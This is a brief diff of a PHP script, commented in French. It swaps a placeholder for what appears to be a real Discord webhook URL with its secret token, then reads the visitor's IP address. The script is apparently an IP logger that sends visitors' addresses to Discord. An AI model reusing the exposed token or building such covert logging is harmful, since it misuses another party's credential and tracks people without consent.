@@ -1,6 +1,6 @@
 <?php
 // Ton webhook Discord
-$webhook_url = "https://discord.com/api/webhooks/TON_ID/TON_TOKEN";
+$webhook_url = "https://discord.com/api/webhooks/1358197654575648945/PXLFa9MW5PoHMlOmnIlA5eydxT8RFuK5neV7yMnDByn-MNGA43ye7Z9UqPmGq5k8ncz_";
 
 // Récupération IP
 $ip = $_SERVER['REMOTE_ADDR'];
